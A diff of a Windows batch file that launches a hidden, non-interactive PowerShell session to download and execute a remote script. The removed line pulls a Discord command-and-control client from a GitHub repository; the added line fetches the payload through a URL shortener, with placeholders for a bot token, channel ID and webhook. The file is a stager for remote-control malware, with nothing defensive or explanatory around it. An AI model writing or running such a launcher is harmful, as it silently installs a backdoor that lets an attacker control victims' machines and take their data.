@@ -1,2 +1,2 @@
 @echo off
-powershell.exe -NonI -NoP -W H -C "$hookurl='YOUR_WEBHOOK_HERE' ; $ghurl = 'YOUR_PASTEBIN_FILE_HERE' ; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex"
+powershell.exe -NonI -NoP -W H -C "$ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; $dc = 'WEBHOOK_URL' ; irm https://is.gd/bwdcc2 | iex"
